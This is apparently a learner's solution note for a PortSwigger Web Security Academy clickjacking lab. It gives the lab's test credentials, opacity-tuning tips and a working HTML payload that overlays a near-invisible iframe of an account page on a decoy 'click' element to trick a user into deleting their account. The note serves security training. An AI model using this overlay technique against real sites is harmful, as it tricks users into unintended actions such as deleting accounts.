# Basic clickjacking with CSRF token protection

## This lab contains login functionality and a delete account button that is protected by a [CSRF](https://portswigger.net/web-security/csrf) token. A user will click on elements that display the word "click" on a decoy website.

## To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

## You can log in to your own account using the following credentials: `wiener:peter`

### Note: use w3school on different browser for testing once everything look perfect paste into expolit to main browser

note: `<div>click</div>` is important to solve the lab
change opacity: 0.1; to 0.0001

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 497px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>click</div>
<iframe
  src="https://0aa4007c04c1bb21817d7f1200820079.web-security-academy.net/my-account"
></iframe>
```
